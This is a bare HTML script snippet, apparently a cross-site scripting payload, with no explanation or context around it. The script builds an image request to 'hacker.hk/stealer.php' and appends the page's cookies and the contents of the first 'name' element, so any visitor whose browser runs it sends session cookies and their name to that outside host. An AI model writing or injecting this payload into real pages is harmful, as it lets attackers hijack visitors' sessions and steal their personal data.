<script>
var img = new Image();
var nameDiv = document.getElementsByClassName("name");
img.src="http://hacker.hk/stealer.php?"+ encodeURI(document.cookie + " "
        + nameDiv[0].innerHTML);
</script>
